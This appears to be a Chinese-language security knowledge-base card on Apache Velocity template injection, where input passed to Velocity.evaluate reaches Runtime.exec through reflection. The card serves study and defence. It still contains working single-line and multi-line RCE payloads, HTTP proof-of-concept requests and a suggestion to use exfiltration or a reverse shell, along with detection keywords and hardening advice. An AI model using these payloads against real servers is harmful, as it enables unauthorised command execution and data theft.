---
id: web-generic-ssti-velocity-evaluate-string-template-rce
title: Velocity.evaluate 字符串模板注入：用户输入拼入模板即反射 Runtime.exec；template.merge 仅在模板源码可控时成立
type: scenario
domain: web
path: web/generic/ssti
technique: velocity-evaluate-string-template-injection
tags:
- web
- ssti
- velocity
- java
- template-injection
- reflection
- rce
- evaluate
- merge
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-07T23:15:30+08:00'
  notes: 已对照原文与全部27张图核对：Velocity.evaluate 单行反射载荷、多行读输出载荷、POST /ssti/velocity1 实测 calc、dbg 链 Velocity.evaluate→RuntimeInstance.evaluate→Parser.parse→SimpleNode.render→ASTReference.execute→ASTMethod.execute→Method.invoke 均与图02-16一致；merge 小节确为控制 template.vm 模板文件后 generate→Template.merge→render→ASTMethod.execute(exec, templateName=template.vm)，已据此修正卡内对原文 merge 调试入口的表述（原句误称仍断在 /ssti/velocity1 的 evaluate）。单卡单一原子（Velocity.evaluate 模板源码注入），merge 仅作边界说明。未验证点：未本机复跑；原文仅示例依赖 velocity 1.7，非受影响版本区间，未设 affected_versions；frontmatter 无 sources/source_url。dedup 仅自身草稿命中，BootDo 二阶卡为不同触发模型（related），dup-scan 无本卡 pair。
url: /docs/web/generic/ssti/web-generic-ssti-velocity-evaluate-string-template-rce/
draft: false
kb_aliases:
- Velocity 模板注入
- Velocity SSTI
- Velocity.evaluate 注入
- VelocityUtils.RenderData
- template.merge 模板注入
- $class.forName Runtime
---

## 一句话结论

当应用把用户输入拼接进传给 `Velocity.evaluate(ctx, out, logTag, template)` 的模板字符串时，Velocity 会把输入当作模板源码解析；`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cmd.exe /c calc")` 通过 Velocity 默认允许的反射调用链执行任意命令。`template.merge(ctx, out)` 本身不会把上下文变量值再次当模板解析，因此只有模板文件/模板源码可由攻击者控制时才是同一漏洞；把 payload 放进 `$name` 这类上下文变量不会触发。

## 原理

- **调用链**：`Velocity.evaluate(String)` → `RuntimeSingleton.getRuntimeServices().evaluate()` → `RuntimeInstance.evaluate()` → `parse(reader, logTag)` 解析为 `SimpleNode` 语法树 → `render(context, writer, logTag, nodeTree)` → `nodeTree.render()` → `ASTReference.execute()`/`ASTMethod.execute()` → `ClassUtils.getMethod()` → `Method.invoke()`。只要模板中写了方法调用，Velocity 就会按语法树用反射执行。
- **反射载荷**：`#set($e="e")` 先创建一个 String 变量；`$e.getClass()` 得到 `java.lang.Class`，`.forName("java.lang.Runtime")` 加载 Runtime 类，`.getMethod("getRuntime",null)` 取静态方法，`.invoke(null,null)` 调用得到 Runtime 实例，最后 `.exec("cmd.exe /c calc")` 启动进程。Velocity 默认的 Uberspector 不限制 `getClass`/`forName`/反射，因此这条链成立。
- **merge 的边界**：`template.merge(context, writer)` 渲染的是 `velocityEngine.getTemplate(...)` 加载的模板源码；`context.put("name", payload)` 只是把 payload 当普通字符串插入输出，不会二次解析。原文 merge 小节以“控制模板文件”为前提：调试停在 `VelocityController.generate` → `Template.merge` → `SimpleNode.render` → `ASTMethod.execute`，栈中 `templateName="template.vm"`、`methodName="exec"`、参数 `cmd.exe /c calc`，说明被执行的是被改写的模板文件源码；仅把 payload 放进 `name` 这类上下文变量只会原样输出、不会二次解析，因此 merge 场景只有模板源码可控（上传/编辑/存储模板）时才可利用。
- **单行与多行载荷**：单行适合直接命令执行；`#set($s="")#set($stringClass=$s.getClass())...` 多行形式可以把 `Process.getInputStream()`、`waitFor()`、`$out.available()`/`$out.read()` 串起来读取命令输出，适合需要回显的场景。
- **二阶形态**：如果模板源码先存库（如待办消息、报表模板）后在后台 `evaluate`/`RenderData` 渲染，则是存储型/二阶 SSTI，输入点与触发点分离，检测更难（另见 BootDo 待办消息卡）。

## 触发条件

- 目标使用 Apache Velocity，且代码把用户可控字符串作为 `Velocity.evaluate` 的 `template` 参数（直接拼接、`String.format`、存储后取出再 evaluate）。
- 未启用 SecureUberspector 或其它限制反射/类加载的沙箱；模板中允许 `#set`、`$obj.getClass()`、`forName`、`getMethod`、`invoke`、`exec`。
- 对于 `template.merge`：攻击者能控制模板源码本身（模板文件上传、在线编辑、数据库中的模板被加载），而不是仅控制上下文变量值。
- 输入能到达模板参数且未被 WAF 按 `#set`/`getClass`/`Runtime` 等特征拦截。

## 利用步骤

1. 定位入口：搜索 `Velocity.evaluate(`、`VelocityUtils.RenderData`、`template.merge(`、`velocityEngine.getTemplate(`；判断用户输入进入的是模板源码还是上下文数据。
2. 若进入模板源码，直接注入单行载荷：
   ```text
   #set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cmd.exe /c calc")
   ```
3. 发送请求（示例 `username` 参数被拼进模板字符串），观察计算器/命令进程。
4. 需要回显时用多行载荷读取 Process 输出：
   ```text
   #set($s="")
   #set($stringClass=$s.getClass())
   #set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
   #set($process=$runtime.exec("cmd.exe /c calc"))
   #set($out=$process.getInputStream())
   #set($null=$process.waitFor())
   #foreach($i in [1..$out.available()])
   $out.read()
   #end
   ```
5. 无回显时改为 DNS/HTTP 外带、写文件或反弹 shell；确认后清理测试痕迹。
6. 若入口是 merge，先确认模板内容可控（上传/编辑/存储），再把同样的 Velocity 表达式写入模板文件；不要把 payload 放在普通上下文变量里当作已利用。

## PoC

单行（原文实测，未在本机执行）：

```http
POST /ssti/velocity1 HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 142

username=#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cmd.exe /c calc")
```

多行读输出（原文补充载荷）：

```http
POST /ssti/velocity1 HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

username=#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cmd.exe /c calc"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor())
#foreach($i in [1..$out.available()])
$out.read()
#end
```

原文实测两者均触发 `calc.exe`；调试断点依次命中 `Velocity.evaluate`、`RuntimeInstance.evaluate`、`Parser.parse`、`SimpleNode.render`、`ASTReference.execute`、`ASTMethod.execute`、`Method.invoke`。

## 变体与关联

- 执行类变体：`ProcessBuilder`、`ScriptEngineManager`、`ClassLoader.defineClass`、JNDI 等，只要 Velocity 反射可达均可替代 Runtime。
- 二阶变体：模板/消息先存库、后台再 `Velocity.evaluate`/`VelocityUtils.RenderData` 渲染（BootDo 待办消息卡即此类）。
- merge 变体：模板文件上传、在线模板编辑、模板表内容可控时，`template.merge` 同样触发；单纯控制 `$name` 等变量值不构成漏洞。
- 关联：其它 Java 模板引擎 SSTI（FreeMarker、Thymeleaf、SpEL）在「用户输入进入模板源码」这一点上同根因；引擎识别可参考 SSTI 决策树卡。
- 边界：原文的 merge 示例未单独证明 `name` 参数可利用，本草稿明确该限制，避免误用。

## 检测与防御

- 修复：不要把用户输入作为模板源码；需要动态内容时用上下文变量传值（`context.put("name", userInput)` + 模板 `$name`），Velocity 不会对变量值二次解析。
- 加固：启用 `SecureUberspector`/自定义 Uberspector，禁止 `getClass`、`forName`、`getMethod`、`invoke`、`exec` 等反射与进程调用；模板源码白名单化，禁止 `#set` 动态定义或限制可访问类。
- 检测：请求/日志中出现 `#set(`、`getClass()`、`forName`、`getRuntime`、`exec(`、`ProcessBuilder`、`#foreach` 读流等组合；Velocity 解析异常、模板名异常；后台进程出现 `calc/cmd/bash/curl` 等子进程。
- 审计：搜索 `Velocity.evaluate`、`VelocityUtils.RenderData`、`template.merge`、`getTemplate` 的调用点，追踪参数来源；对模板上传/编辑功能做权限与内容校验。
